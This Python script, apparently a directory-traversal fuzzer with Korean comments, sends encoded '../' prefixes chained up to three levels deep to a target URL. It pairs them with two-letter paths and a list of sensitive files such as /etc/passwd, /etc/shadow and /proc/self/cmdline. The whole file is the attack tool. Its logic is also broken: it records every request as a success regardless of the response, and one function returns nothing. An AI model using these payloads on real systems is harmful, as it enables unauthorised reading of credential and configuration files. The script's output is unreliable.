import sys
import requests as req
import urllib
import argparse
#from requester import requester
#from config import converter, headers  
from requests.exceptions import HTTPError
from itertools import permutations

#metasploit direactory traversal exploit dictionary check
#dictionary 값을 기반으로 random input host 주소 뒤에 날려서
#만약 권한 없이 들어가지는 값이 있으면 저장해서 마지막에 출력

prefix = ["../","..%255c","%2e%2e%2f","%2e%2e/","..%2f","%2e%2e%5c","%2e%2e\\","..%5c","%252e%252e%255c"]

def random_path(url):
    print(">>>>random_path fuzzing start")
    alphabets = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n',
            'o','p','q','r','s','t','u','v','w','x','y','z']
    random_success = []
    nn = 2 #length
    depth = 3
    path_permutation= list(permutations(alphabets,nn))
    paths = []
    for i in path_permutation:
        paths.append("".join(i))
    for path in paths:
        try:
            for i in range(len(prefix)):
                for j in range(0,depth+1):
                    res = req.post(url+prefix[i]*j+path)
                    random_success.append(path)
        except:
            print(path,": fail")


def existed_path(url):
    print(">>>>existed_path fuzzing start")
    file_list = ["/etc/apache2/apache2.conf",
                "/etc/apt/sources.list",
                "/etc/centos-release"
                "/etc/debian_version",
                "/etc/fstab",
                "/etc/group",
                "/etc/hosts",
                "/etc/httpd/conf.d/ssl.conf",
                "/etc/httpd/conf.d/vhost.conf",
                "/etc/httpd/conf/httpd.conf",
                "/etc/inetd.conf",
                "/etc/inittab",
                "/etc/issue",
                "/etc/motd",
                "/etc/mysql/my.cnf",
                "/etc/os-release",
                "/etc/passwd",
                "/etc/rc.d/rc.local",
                "/etc/redhat-release",
                "/etc/rsyslog.conf",
                "/etc/shadow",
                "/etc/system-release",
                "/etc/yum.conf",
                "/proc/cmdline",
                "/proc/mounts",
                "/proc/net/arp",
                "/proc/net/dev",
                "/proc/net/if_inet6",
                "/proc/net/route",
                "/proc/net/tcp",
                "/proc/net/udp",
                "/proc/sched_debug",
                "/proc/self/cmdline",
                "/proc/version",
                "/var/log/messages",
                "/var/log/system.log",
                "/var/www/html/index.html"] #추가 필요
    depth = 3 #임의로 지정
    existed_success = []
    for path in file_list:
        try:
            for i in range(len(prefix)):
                for j in range(0,depth+1):
                    res = req.post(url+prefix[i]*j+path) #payload의 prefix 지정
                    existed_success.append(path)
        except:
            print(path,": fail")
    return existed_success

if __name__ == "__main__":
    print("=============start============")
    url = input("target url: ")
#    paramData, url = converter(url)
#    if not url.startswith('http'):
#        try:
#            response = requester('https://' + url, headers, paramData)
#            url = 'https://' + url
#        except:
#            url = 'http://' + url
#
#    if requester(url, headers, paramData) == -1:
#        sys.exit(-1)
    
    random_success = random_path(url)
    existed_success = existed_path(url)
    print("Random Success: ",random_success)
    print("Existed Success: ", existed_success)

